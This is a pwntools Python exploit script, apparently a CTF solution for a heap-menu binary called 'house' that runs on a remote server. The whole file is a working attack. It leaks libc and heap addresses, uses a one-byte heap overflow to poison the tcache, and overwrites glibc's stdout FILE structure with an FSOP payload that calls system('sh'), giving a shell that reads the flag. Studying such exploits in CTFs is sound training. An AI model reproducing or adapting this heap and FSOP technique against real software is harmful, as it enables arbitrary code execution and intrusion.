#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './house'
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '27.112.79.222', 7012

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def malloc(idx, size, data):
    io.sendlineafter(b'(_)>', b'2')
    io.sendlineafter(b'(2)>', str(idx).encode())
    io.sendlineafter(b'it?', str(size).encode())
    io.send(data)

def free(idx):
    io.sendlineafter(b'(_)>', b'3')
    io.sendlineafter(b'(3)>', str(idx).encode())

def show(idx):
    io.sendlineafter(b'(_)>', b'1')
    io.sendlineafter(b'(1)>', str(idx).encode()) 

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val   

heap = 0x0
def exploit():
    global io
    io = initialize()

    # leak libc
    malloc(0, 0x500, b'\n')
    malloc(1, 0x8, b'prot')
    free(0)
    malloc(0, 0x500, b'a')
    show(0)
    libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x1fed61
    fp = libc.address + 0x1ff7a0 # _IO_2_1_stdout_
    system = libc.address + 0x552b0
    wfile_jumps = libc.address+0x1fd468 # _IO_wfile_jumps

    # prep chunks
    malloc(2, 0x18, b'\n')          # overflow to overwrite adjacent chunk size
    malloc(3, 0x200-0x10, b'\n')
    malloc(4, 0x250, b'\n')         
    malloc(5, 0x250, b'\n')         
    malloc(6, 0x8, b'prot')
    
    # one byte overflow change size to be bigger to heap overflow
    free(2)
    payload = p64(0x0) * 3 + b'\x70'
    malloc(2, 0x18, payload)
    
    # tcache setup
    free(5)
    free(4)

    # leak heap
    free(3)
    payload = b'A' * (0x200-1) + b'B'
    malloc(3, 0x278-0x10, payload)
    show(3)
    io.recvuntil(b'AB')
    heap = demangle(u64(io.recv(6).ljust(8, b'\x00'))) - 0xc50

    # overwrite next pointer
    free(3)
    payload = p64(0x0) * 63 + p64(0x261) + p64(mangle(heap+0x9f0, fp))
    malloc(3, 0x278-0x10, payload)

    # restore size, ease of debug
    free(2)
    payload = p64(0x0) * 3 + b'\x00'
    malloc(2, 0x18, payload)

    # fsop payload from: https://github.com/HyggeHalcyon/CTFs/blob/main/2024/Ã¥ngstrom/heapify/exploit.py
    overlap = b'  sh\x00\x00\x00\x00' # [FILE] _flags | [WIDE DATA] read_ptr
    overlap += flat([
        p64(0x0),               # [WIDE DATA] read_end
        p64(0x0),               # [WIDE DATA] read_base
        p64(0x0),               # [WIDE DATA] write_base
        p64(0x0),               # [WIDE DATA] write_ptr
        p64(0x0),               # [WIDE DATA] write_end
        p64(0x0),               # [WIDE DATA] buf_base
        p64(0x0),               # [WIDE DATA] buf_end 
        p64(0x0),               # [WIDE DATA] save_base
        p64(0x0),               # [WIDE DATA] backup_base 
        p64(0x0),               # [WIDE DATA] save_end
    ])
    overlap += b'\x00' * 8       # [WIDE DATA] state
    overlap += b'\x00' * 8       # [WIDE DATA] last_state

    codecvt = b''
    codecvt += p64(system)                      # [FILE] _chain | [WIDE DATA] codecvt | [VTABLE] __doallocate (at function authenticate, skips the puts because we overwrote stdout)
    codecvt += b'\x00' * 0x18                   # padding
    codecvt += p64(fp - 0x10)                   # [FILE] _lock
    codecvt += p64(0x0) * 2                     # padding
    codecvt += p64(fp+0x8)                      # [FILE] _wide_data
    codecvt += b'\x00' * (0x18 + 4 + 20)        # padding
    codecvt += p64(wfile_jumps)                 # [FILE] vtable
    codecvt += b'\x00' * (0x70 - len(codecvt))  # padding

    overlap += codecvt
    overlap += p64(0x0)                         # [WIDE DATA] wchar_t shortbuf[1] (alligned to 8 bytes)
    overlap += p64(fp)                          # [WIDE DATA] vtable

    malloc(4, 0x250, b'\n')
    malloc(5, 0x250, overlap) 

    sleep(0.2)
    io.sendline(b'cat flag*')

    log.success('libc base: %#x', libc.address)
    log.success('heap base: %#x', heap)
    log.success('fp: %#x', fp)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
